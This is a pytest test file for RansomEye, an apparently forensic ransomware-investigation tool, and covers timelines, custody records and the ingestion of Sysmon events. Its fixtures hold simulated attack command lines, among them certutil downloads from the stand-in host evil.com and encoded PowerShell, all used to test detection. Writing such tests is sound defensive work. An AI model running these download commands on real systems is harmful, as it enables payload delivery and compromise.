import os
import subprocess
import sys
from pathlib import Path

from ransomeye.commands import print_case_timeline, print_case_tree
from ransomeye.storage import EvidenceStore


def test_print_case_timeline_renders_expected_columns(capsys, tmp_path):
    database_path = tmp_path / "ransomeye.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="RE-LIVE-001", case_name="Timeline View", host="LAPTOP-AKCCFV29")
    store.save_event(
        "RE-LIVE-001",
        {
            "event_id": "event-1",
            "timestamp": "2026-08-08T21:48:01Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "pid": "100",
            "process_guid": "guid-1",
            "parent_process_guid": "guid-parent",
            "parent_image": r"C:\Windows\explorer.exe",
            "command_line": "powershell.exe -NoProfile",
        },
    )
    store.save_event(
        "RE-LIVE-001",
        {
            "event_id": "event-2",
            "timestamp": "2026-08-08T21:48:02Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "conhost.exe",
            "pid": "200",
            "process_guid": "guid-2",
            "parent_process_guid": "guid-1",
            "parent_image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "parent_pid": "100",
            "command_line": "conhost.exe",
        },
    )
    store.close()

    print_case_timeline(database_path, "RE-LIVE-001")
    output = capsys.readouterr().out

    assert "Case: RE-LIVE-001" in output
    assert "Host: LAPTOP-AKCCFV29" in output
    assert "powershell.exe" in output
    assert "conhost.exe" in output
    assert "explorer.exe" in output


def test_print_case_tree_renders_root_and_children(capsys, tmp_path):
    database_path = tmp_path / "ransomeye.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="RE-TREE-001", case_name="Tree View", host="LAPTOP-AKCCFV29")
    store.save_event(
        "RE-TREE-001",
        {
            "event_id": "event-1",
            "timestamp": "2026-08-08T21:48:01Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "pid": "100",
            "command_line": "powershell.exe -NoProfile",
        },
    )
    store.save_event(
        "RE-TREE-001",
        {
            "event_id": "event-2",
            "timestamp": "2026-08-08T21:48:02Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "conhost.exe",
            "pid": "200",
            "parent_pid": "100",
            "command_line": "conhost.exe",
        },
    )
    store.close()

    print_case_tree(database_path, "RE-TREE-001")
    output = capsys.readouterr().out

    assert "Case: RE-TREE-001" in output
    assert "powershell.exe [PID 100]" in output
    assert "conhost.exe [PID 200]" in output
    assert "└──" in output


def _run_command(args, cwd=None):
    env = os.environ.copy()
    env["PYTHONPATH"] = str(Path(__file__).resolve().parents[1] / "src")
    result = subprocess.run(
        [sys.executable, "-m", "ransomeye.commands", *args],
        cwd=cwd,
        env=env,
        capture_output=True,
        text=True,
    )
    return result



def test_custody_record_command_creates_event(tmp_path):
    database_path = tmp_path / "test.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="CASE-001", case_name="Custody Command")
    store.close()

    result = _run_command(
        [
            "custody",
            "record",
            "--database",
            str(database_path),
            "--case",
            "CASE-001",
            "--artifact",
            "reports/case-report.txt",
            "--hash",
            "a" * 64,
            "--action",
            "created",
            "--analyst",
            "analyst@example.com",
            "--note",
            "Initial report generated",
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Recorded custody event for case CASE-001" in result.stdout

    store = EvidenceStore(database_path)
    events = store.get_custody_events("CASE-001")
    store.close()

    assert len(events) == 1
    assert events[0]["action"] == "created"
    assert events[0]["analyst"] == "analyst@example.com"


def test_custody_list_command_prints_history(tmp_path):
    database_path = tmp_path / "test.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="CASE-001", case_name="Custody Command")
    store.record_custody_event(
        case_id="CASE-001",
        artifact_path="reports/case-report.txt",
        sha256="b" * 64,
        action="created",
        analyst="analyst@example.com",
        note="Initial report generated",
        verification_result=None,
    )
    store.close()

    result = _run_command(
        [
            "custody",
            "list",
            "--database",
            str(database_path),
            "--case",
            "CASE-001",
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Artifact: reports/case-report.txt" in result.stdout
    assert "Action: created" in result.stdout
    assert "Analyst: analyst@example.com" in result.stdout


def test_custody_record_rejects_invalid_action(tmp_path):
    database_path = tmp_path / "test.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="CASE-001", case_name="Custody Command")
    store.close()

    result = _run_command(
        [
            "custody",
            "record",
            "--database",
            str(database_path),
            "--case",
            "CASE-001",
            "--artifact",
            "reports/case-report.txt",
            "--hash",
            "a" * 64,
            "--action",
            "deleted",
            "--analyst",
            "analyst@example.com",
            "--note",
            "",
        ],
        cwd=tmp_path,
    )

    assert result.returncode != 0
    assert "Invalid custody action" in result.stderr


def test_custody_record_rejects_missing_case(tmp_path):
    database_path = tmp_path / "test.db"

    result = _run_command(
        [
            "custody",
            "record",
            "--database",
            str(database_path),
            "--case",
            "CASE-001",
            "--artifact",
            "reports/case-report.txt",
            "--hash",
            "a" * 64,
            "--action",
            "created",
            "--analyst",
            "analyst@example.com",
            "--note",
            "",
        ],
        cwd=tmp_path,
    )

    assert result.returncode != 0
    assert "Case not found: CASE-001" in result.stderr


def test_custody_record_rejects_invalid_hash(tmp_path):
    database_path = tmp_path / "test.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="CASE-001", case_name="Custody Command")
    store.close()

    result = _run_command(
        [
            "custody",
            "record",
            "--database",
            str(database_path),
            "--case",
            "CASE-001",
            "--artifact",
            "reports/case-report.txt",
            "--hash",
            "deadbeef",
            "--action",
            "created",
            "--analyst",
            "analyst@example.com",
            "--note",
            "",
        ],
        cwd=tmp_path,
    )

    assert result.returncode != 0
    assert "Invalid SHA-256 digest" in result.stderr


def test_export_command(tmp_path):
    database_path = tmp_path / "test.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="CASE-CLI-001", case_name="Export CLI Case")
    store.close()

    output_dir = tmp_path / "exports" / "CASE-CLI-001"

    result = _run_command(
        [
            "export",
            "--database",
            str(database_path),
            "--case",
            "CASE-CLI-001",
            "--output",
            str(output_dir),
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Exported case package to" in result.stdout
    assert (output_dir / "MANIFEST.sha256").exists()


def test_cli_help():
    result = _run_command(["--help"])

    assert result.returncode == 0
    assert "timeline" in result.stdout
    assert "database" in result.stdout
    assert "ingest" in result.stdout


def test_cli_invalid_command():
    result = _run_command(["invalid-command"])

    assert result.returncode == 2
    assert "usage:" in result.stderr.lower()


# --- Milestone 21.3 CLI Ingestion Tests ---

import json
from ransomeye.commands import ingest_evidence, parse_evidence_file


SAMPLE_SYSMON_XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-08-08T15:00:00.000Z"/>
  </System>
  <EventData>
    <Data Name="ProcessGuid">{GUID-TEST-1}</Data>
    <Data Name="ProcessId">4532</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -EncodedCommand SGVsbG8=</Data>
    <Data Name="User">LAB\\Student</Data>
  </EventData>
</Event>"""

SAMPLE_SYSMON_MULTI_XML = """<Events>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-08-08T15:00:00.000Z"/>
  </System>
  <EventData>
    <Data Name="ProcessGuid">{GUID-MULTI-1}</Data>
    <Data Name="ProcessId">1001</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -enc AAAA</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-08-08T15:00:05.000Z"/>
  </System>
  <EventData>
    <Data Name="ProcessGuid">{GUID-MULTI-2}</Data>
    <Data Name="ProcessId">1002</Data>
    <Data Name="Image">C:\\Windows\\System32\\certutil.exe</Data>
    <Data Name="CommandLine">certutil.exe -urlcache -split -f http://evil.com/x.bin out.bin</Data>
  </EventData>
</Event>
</Events>"""


def test_ingest_json_single_event_via_cli(tmp_path):
    db_path = tmp_path / "cli_ingest.db"
    json_path = tmp_path / "single_event.json"
    event_data = {
        "event_id": "evt-json-1",
        "timestamp": "2026-08-08T15:00:00Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
        "pid": "4532",
    }
    json_path.write_text(json.dumps(event_data), encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-JSON-1",
            "--file",
            str(json_path),
            "--case-name",
            "JSON Single Case",
            "--host",
            "HOST-A",
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "RansomEye evidence ingestion complete" in result.stdout
    assert "Events read: 1" in result.stdout
    assert "Events accepted: 1" in result.stdout
    assert "Duplicates: 0" in result.stdout
    assert "Score: 25" in result.stdout

    store = EvidenceStore(db_path)
    case = store.get_case("CASE-JSON-1")
    events = store.get_case_events("CASE-JSON-1")
    store.close()

    assert case["case_name"] == "JSON Single Case"
    assert len(events) == 1
    assert events[0]["event_id"] == "evt-json-1"


def test_ingest_json_list_and_events_wrapper(tmp_path):
    db_path = tmp_path / "list_ingest.db"
    json_path = tmp_path / "events_wrapper.json"
    data = {
        "events": [
            {
                "event_id": "evt-w-1",
                "timestamp": "2026-08-08T15:00:00Z",
                "source": "sysmon",
                "event_type": "process_creation",
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -enc AAAA",
                "pid": "1000",
                "process_guid": "{G-1}",
            },
            {
                "event_id": "evt-w-2",
                "timestamp": "2026-08-08T15:00:05Z",
                "source": "sysmon",
                "event_type": "process_creation",
                "process_name": "certutil.exe",
                "command_line": "certutil.exe -urlcache -split -f http://evil.com/x.exe out.exe",
                "pid": "1000",
                "process_guid": "{G-1}",
            },
        ]
    }
    json_path.write_text(json.dumps(data), encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-WRAPPER",
            "--file",
            str(json_path),
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Events read: 2" in result.stdout
    assert "Events accepted: 2" in result.stdout
    assert "Correlations: 1" in result.stdout

    store = EvidenceStore(db_path)
    events = store.get_case_events("CASE-WRAPPER")
    findings = store.get_case_findings("CASE-WRAPPER")
    store.close()

    assert len(events) == 2
    assert len(findings) == 2


def test_ingest_sysmon_xml_fixture_via_cli(tmp_path):
    db_path = tmp_path / "xml_ingest.db"
    xml_path = tmp_path / "sample.xml"
    xml_path.write_text(SAMPLE_SYSMON_XML, encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-XML-1",
            "--file",
            str(xml_path),
            "--format",
            "sysmon-xml",
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Format: sysmon-xml" in result.stdout
    assert "Events read: 1" in result.stdout
    assert "Events accepted: 1" in result.stdout

    store = EvidenceStore(db_path)
    events = store.get_case_events("CASE-XML-1")
    store.close()

    assert len(events) == 1
    assert events[0]["process_guid"] == "{GUID-TEST-1}"


def test_ingest_sysmon_xml_multiple_events(tmp_path):
    db_path = tmp_path / "multi_xml.db"
    xml_path = tmp_path / "multi.xml"
    xml_path.write_text(SAMPLE_SYSMON_MULTI_XML, encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-XML-MULTI",
            "--file",
            str(xml_path),
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Events read: 2" in result.stdout
    assert "Events accepted: 2" in result.stdout


def test_ingest_duplicate_events_counted(tmp_path):
    db_path = tmp_path / "dup.db"
    xml_path = tmp_path / "dup.xml"
    xml_path.write_text(SAMPLE_SYSMON_XML, encoding="utf-8")

    # Ingest first time
    _run_command(["ingest", "--database", str(db_path), "--case", "CASE-DUP", "--file", str(xml_path)])

    # Ingest second time -> 1 duplicate
    result2 = _run_command(["ingest", "--database", str(db_path), "--case", "CASE-DUP", "--file", str(xml_path)])

    assert result2.returncode == 0
    assert "Events read: 1" in result2.stdout
    assert "Events accepted: 0" in result2.stdout
    assert "Duplicates: 1" in result2.stdout


def test_ingest_missing_file_fails(tmp_path):
    db_path = tmp_path / "test.db"
    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-ERR",
            "--file",
            str(tmp_path / "nonexistent.json"),
        ]
    )
    assert result.returncode != 0
    assert "Evidence file not found" in result.stderr


def test_ingest_json_single_event_via_cli(tmp_path):
    db_path = tmp_path / "cli_ingest.db"
    json_path = tmp_path / "single_event.json"
    event_data = {
        "event_id": "evt-json-1",
        "timestamp": "2026-08-08T15:00:00Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
        "pid": "4532",
    }
    json_path.write_text(json.dumps(event_data), encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-JSON-1",
            "--file",
            str(json_path),
            "--case-name",
            "JSON Single Case",
            "--host",
            "HOST-A",
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "RansomEye evidence ingestion complete" in result.stdout
    assert "Events read: 1" in result.stdout
    assert "Events accepted: 1" in result.stdout
    assert "Duplicates: 0" in result.stdout
    assert "Score: 25" in result.stdout

    store = EvidenceStore(db_path)
    case = store.get_case("CASE-JSON-1")
    events = store.get_case_events("CASE-JSON-1")
    store.close()

    assert case["case_name"] == "JSON Single Case"
    assert len(events) == 1
    assert events[0]["event_id"] == "evt-json-1"


def test_ingest_json_list_and_events_wrapper(tmp_path):
    db_path = tmp_path / "list_ingest.db"
    json_path = tmp_path / "events_wrapper.json"
    data = {
        "events": [
            {
                "event_id": "evt-w-1",
                "timestamp": "2026-08-08T15:00:00Z",
                "source": "sysmon",
                "event_type": "process_creation",
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -enc AAAA",
                "pid": "1000",
                "process_guid": "{G-1}",
            },
            {
                "event_id": "evt-w-2",
                "timestamp": "2026-08-08T15:00:05Z",
                "source": "sysmon",
                "event_type": "process_creation",
                "process_name": "certutil.exe",
                "command_line": "certutil.exe -urlcache -split -f http://evil.com/x.exe out.exe",
                "pid": "1000",
                "process_guid": "{G-1}",
            },
        ]
    }
    json_path.write_text(json.dumps(data), encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-WRAPPER",
            "--file",
            str(json_path),
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Events read: 2" in result.stdout
    assert "Events accepted: 2" in result.stdout
    assert "Correlations: 1" in result.stdout

    store = EvidenceStore(db_path)
    events = store.get_case_events("CASE-WRAPPER")
    findings = store.get_case_findings("CASE-WRAPPER")
    store.close()

    assert len(events) == 2
    assert len(findings) == 2


def test_ingest_sysmon_xml_fixture_via_cli(tmp_path):
    db_path = tmp_path / "xml_ingest.db"
    xml_path = tmp_path / "sample.xml"
    xml_path.write_text(SAMPLE_SYSMON_XML, encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-XML-1",
            "--file",
            str(xml_path),
            "--format",
            "sysmon-xml",
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Format: sysmon-xml" in result.stdout
    assert "Events read: 1" in result.stdout
    assert "Events accepted: 1" in result.stdout

    store = EvidenceStore(db_path)
    events = store.get_case_events("CASE-XML-1")
    store.close()

    assert len(events) == 1
    assert events[0]["process_guid"] == "{GUID-TEST-1}"


def test_ingest_sysmon_xml_multiple_events(tmp_path):
    db_path = tmp_path / "multi_xml.db"
    xml_path = tmp_path / "multi.xml"
    xml_path.write_text(SAMPLE_SYSMON_MULTI_XML, encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-XML-MULTI",
            "--file",
            str(xml_path),
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Events read: 2" in result.stdout
    assert "Events accepted: 2" in result.stdout


def test_ingest_duplicate_events_counted(tmp_path):
    db_path = tmp_path / "dup.db"
    xml_path = tmp_path / "dup.xml"
    xml_path.write_text(SAMPLE_SYSMON_XML, encoding="utf-8")

    # Ingest first time
    _run_command(["ingest", "--database", str(db_path), "--case", "CASE-DUP", "--file", str(xml_path)])

    # Ingest second time -> 1 duplicate
    result2 = _run_command(["ingest", "--database", str(db_path), "--case", "CASE-DUP", "--file", str(xml_path)])

    assert result2.returncode == 0
    assert "Events read: 1" in result2.stdout
    assert "Events accepted: 0" in result2.stdout
    assert "Duplicates: 1" in result2.stdout


def test_ingest_missing_file_fails(tmp_path):
    db_path = tmp_path / "test.db"
    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-ERR",
            "--file",
            str(tmp_path / "nonexistent.json"),
        ]
    )
    assert result.returncode != 0
    assert "Evidence file not found" in result.stderr


def test_ingest_invalid_json_fails(tmp_path):
    db_path = tmp_path / "test.db"
    bad_json = tmp_path / "bad.json"
    bad_json.write_text("{broken json", encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-ERR",
            "--file",
            str(bad_json),
        ]
    )
    assert result.returncode != 0
    assert "Invalid JSON" in result.stderr


def test_ingest_invalid_xml_fails(tmp_path):
    db_path = tmp_path / "test.db"
    bad_xml = tmp_path / "bad.xml"
    bad_xml.write_text("<not valid xml at all", encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-ERR",
            "--file",
            str(bad_xml),
        ]
    )
    assert result.returncode != 0
    assert "No valid Sysmon XML events found" in result.stderr


def test_ingest_empty_file_fails(tmp_path):
    db_path = tmp_path / "test.db"
    empty_file = tmp_path / "empty.json"
    empty_file.write_text("   \n", encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-ERR",
            "--file",
            str(empty_file),
        ]
    )
    assert result.returncode != 0
    assert "Evidence file is empty" in result.stderr


def test_ingest_existing_case_preserves_metadata(tmp_path):
    db_path = tmp_path / "existing.db"
    store = EvidenceStore(db_path)
    store.create_case("CASE-EXIST", "Original Name", host="ORIGINAL-HOST")
    store.close()

    json_path = tmp_path / "event.json"
    import json
    json_path.write_text(json.dumps({"event_id": "e-1", "timestamp": "2026-08-08T15:00:00Z", "source": "sysmon", "event_type": "process_creation"}), encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-EXIST",
            "--file",
            str(json_path),
            "--case-name",
            "New Ignored Name",
        ]
    )
    assert result.returncode == 0

    store = EvidenceStore(db_path)
    case = store.get_case("CASE-EXIST")
    store.close()

    assert case["case_name"] == "Original Name"
    assert case["host"] == "ORIGINAL-HOST"


def test_investigation_graph_command(tmp_path):
    db_path = tmp_path / "graph_test.db"
    json_path = tmp_path / "event.json"
    import json
    json_path.write_text(
        json.dumps({
            "event_id": "e-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "cmd.exe",
            "pid": "1000",
            "process_guid": "{G-1000}",
        }),
        encoding="utf-8",
    )

    _run_command([
        "ingest",
        "--database",
        str(db_path),
        "--case",
        "CASE-GRAPH",
        "--file",
        str(json_path),
    ])

    result = _run_command([
        "investigation",
        "graph",
        "--database",
        str(db_path),
        "--case",
        "CASE-GRAPH",
    ])

    assert result.returncode == 0
    assert "INVESTIGATION GRAPH" in result.stdout
    assert "Case:" in result.stdout
    assert "CASE-GRAPH" in result.stdout
    assert "Processes:" in result.stdout


def test_investigation_reconstruct_command(tmp_path):
    db_path = tmp_path / "reconstruct_test.db"
    json_path = tmp_path / "event.json"
    import json
    json_path.write_text(
        json.dumps({
            "event_id": "e-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "cmd.exe",
            "pid": "1000",
            "process_guid": "{G-1000}",
            "command_line": "cmd.exe /c echo test",
        }),
        encoding="utf-8",
    )

    _run_command([
        "ingest",
        "--database",
        str(db_path),
        "--case",
        "CASE-RECON",
        "--file",
        str(json_path),
    ])

    result = _run_command([
        "investigation",
        "reconstruct",
        "--database",
        str(db_path),
        "--case",
        "CASE-RECON",
    ])

    assert result.returncode == 0
    assert "ATTACK RECONSTRUCTION" in result.stdout
    assert "PROCESS_EXECUTION" in result.stdout
    assert "cmd.exe [PID 1000]" in result.stdout


def test_investigation_timeline_and_flag_command(tmp_path):
    db_path = tmp_path / "adv_timeline_test.db"
    json_path = tmp_path / "event.json"
    import json
    json_path.write_text(
        json.dumps({
            "event_id": "e-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "cmd.exe",
            "pid": "1000",
            "process_guid": "{G-1000}",
        }),
        encoding="utf-8",
    )

    _run_command([
        "ingest",
        "--database",
        str(db_path),
        "--case",
        "CASE-ADV",
        "--file",
        str(json_path),
    ])

    # 1. Test via `investigation timeline`
    result1 = _run_command([
        "investigation",
        "timeline",
        "--database",
        str(db_path),
        "--case",
        "CASE-ADV",
    ])
    assert result1.returncode == 0
    assert "ADVANCED INVESTIGATION TIMELINE" in result1.stdout
    assert "PROCESS" in result1.stdout

    # 2. Test via `timeline --advanced`
    result2 = _run_command([
        "timeline",
        "--database",
        str(db_path),
        "--case",
        "CASE-ADV",
        "--advanced",
    ])
    assert result2.returncode == 0
    assert "ADVANCED INVESTIGATION TIMELINE" in result2.stdout
    assert "PROCESS" in result2.stdout


def test_realistic_ransomware_sequence_integration(tmp_path):
    import os
    db_path = tmp_path / "realistic_ransomware.db"
    
    samples_dir = os.path.join(os.path.dirname(__file__), "..", "samples", "sysmon")
    xml_path = os.path.join(samples_dir, "realistic_ransomware_sequence.xml")
    
    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-RANSOMWARE",
            "--file",
            str(xml_path),
            "--format",
            "sysmon-xml",
        ],
        cwd=tmp_path,
    )
    
    assert result.returncode == 0
    assert "Events read: 7" in result.stdout
    assert "Events accepted: 7" in result.stdout
    assert "Events rejected: 0" in result.stdout
    assert "Duplicates: 0" in result.stdout
    assert "Findings: 4" in result.stdout or "Findings" in result.stdout
    
    # Verify we can run graph and timeline without crashing on real data
    result2 = _run_command([
        "investigation",
        "timeline",
        "--database",
        str(db_path),
        "--case",
        "CASE-RANSOMWARE",
    ])
    assert result2.returncode == 0
    assert "ADVANCED INVESTIGATION TIMELINE" in result2.stdout
